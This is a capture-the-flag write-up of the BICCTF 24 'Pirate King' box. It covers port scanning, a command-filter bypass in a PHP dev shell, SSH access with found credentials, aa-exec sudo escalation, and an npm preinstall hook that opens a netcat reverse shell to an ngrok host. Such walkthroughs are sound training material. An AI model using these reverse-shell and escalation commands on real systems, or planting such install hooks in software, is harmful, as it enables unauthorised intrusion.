---
title: Blacks In Cybersecurity
date: 2024-8-11 13:10:30 +0000
categories: [CTFS]
tags: [CTFS]
math: true
mermaid: true
media_subpath: /assets/posts/ctfs/bic24
image:
  path: preview.png
---
* * *

### CTF: BICCTF 24

* * *

------------------------

### CHALLENGES

### B2R

-     Pirate King:Question [9] - [12]

-----------------------

### Pirate King

![image](https://github.com/user-attachments/assets/53744598-c639-4c2a-9fab-074e4051614a)

- The server was hosted on ip:`54.226.229.244`
   
- I scanned with Rustcan and discovered 2 open ports, port 80 `http` and port 22 `ssh` respectively.


      ❯ rustscan -a 54.226.229.244

      .----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
      | {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
      | .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
      `-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
      The Modern Day Port Scanner.
      ________________________________________
      : https://discord.gg/GFrQsGy           :
      : https://github.com/RustScan/RustScan :
       --------------------------------------
      Nmap? More like slowmap.🐢
      
      [~] The config file is expected to be at "/home/sensei/.rustscan.toml"
      [!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
      [!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
      Open 54.226.229.244:22
      Open 54.226.229.244:80
      [~] Starting Script(s)
      [>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")
      
      [~] Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-11 04:44 EDT
      Initiating Ping Scan at 04:44
      Scanning 54.226.229.244 [2 ports]
      Completed Ping Scan at 04:44, 0.30s elapsed (1 total hosts)
      Initiating Parallel DNS resolution of 1 host. at 04:44
      Completed Parallel DNS resolution of 1 host. at 04:44, 2.03s elapsed
      DNS resolution of 1 IPs took 2.03s. Mode: Async [#: 1, OK: 1, NX: 0, DR: 0, SF: 0, TR: 1, CN: 0]
      Initiating Connect Scan at 04:44
      Scanning ec2-54-226-229-244.compute-1.amazonaws.com (54.226.229.244) [2 ports]
      Discovered open port 80/tcp on 54.226.229.244
      Discovered open port 22/tcp on 54.226.229.244
      Completed Connect Scan at 04:44, 0.27s elapsed (2 total ports)
      Nmap scan report for ec2-54-226-229-244.compute-1.amazonaws.com (54.226.229.244)
      Host is up, received syn-ack (0.29s latency).
      Scanned at 2024-08-11 04:44:30 EDT for 0s

      PORT   STATE SERVICE REASON
      22/tcp open  ssh     syn-ack
      80/tcp open  http    syn-ack
- The site's source code contains this hint to check `robots.txt` file

![image](https://github.com/user-attachments/assets/e6ee4bf9-940e-4540-b413-41652c4611b3)

- The robots.txt file disallow crawling of files `syrup.jpeg` and `kaya.txt`
![image](https://github.com/user-attachments/assets/88594d64-5b2b-462b-a829-1e020033be19)

- Kaya.txt leads us to `dev_shell.php` page where we can execute shell commands.Although the shell code filters shell commands,checking the source code presents our first flag
![image](https://github.com/user-attachments/assets/8866ab4b-d112-48f2-bc4e-614e25a0320f)

- Flag-:``` BICCTF{Bl@ck_C@t_P1r@tes}```

### SSH ACCESS

- Running `l\s` to bypass the filter reveals a txt file.

![image](https://github.com/user-attachments/assets/3affc173-bb7a-48c5-9bff-38b0b99222a3)

- The txt file contains ssh credentials for the user `kuro`

![image](https://github.com/user-attachments/assets/602078b4-7702-4904-bdbf-5b30b8c50c9b)

- SSH Access
![image](https://github.com/user-attachments/assets/da974b06-bebb-4c72-97b5-073ca20e3692)

- `/home/kuro/Desktop/flag2.txt` contains the second flag
![image](https://github.com/user-attachments/assets/6c24be62-2334-4315-91da-8c8aba7c9c8b)

- Flag2-:```BICCTF{Nukia$hi}```

### User Usopp
- Running `sudo -l` as user `kuro` shows we can run binary `aa-exec` as user `usopp` without password.

![image](https://github.com/user-attachments/assets/99f8b741-280a-4ef9-b763-907ba73b6b59)

- I got this payload from gtfobins `aa-exec /bin/sh -p`, run with `aa-exec /bin/bash -p` to get a bash shell.Now, we have access to user `Usopp`
   Payload-:```sudo -u usopp aa-exec /bin/bash -p```

![image](https://github.com/user-attachments/assets/9ea1e3f3-d4ab-41e0-ac82-ff34291e62bd)

- The third flag is located in `/home/usopp/Desktop/flag3.txt`

![image](https://github.com/user-attachments/assets/d677d4c6-504d-438f-a84e-1ea259b792ab)

- Flag3-:```BICCTF{P@ch1nko}```
  
### Accessing User `node` with `npm install` cronjob

- This hint in the `Document` directory reveals a nodejob that run every 2mins

![image](https://github.com/user-attachments/assets/f862d4c6-0403-4d1e-b485-8ffbd4ebdcc2)

- We can abuse the package-lock.json file to spawn a reverse shell by creating a new one since the present one cannot be edited.You can also add it to the package.json file.

      {
        "name": ".nodeitems",
        "scripts": {
                 "preinstall": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 5.tcp.eu.ngrok.io 11222 >/tmp/f"
             }
      }
      
- Shell Access to user `node`

![image](https://github.com/user-attachments/assets/80caf1f3-99fb-4f6a-b1c4-d41336e8595d)

- The last flag is located in `/home/node/flag4.txt`.

![image](https://github.com/user-attachments/assets/26184e5b-89bf-4e3d-8679-1a82b145961c)

- Flag4-:```BICCTF{n0deM@st3r}```

### THANKS FOR READING !!!
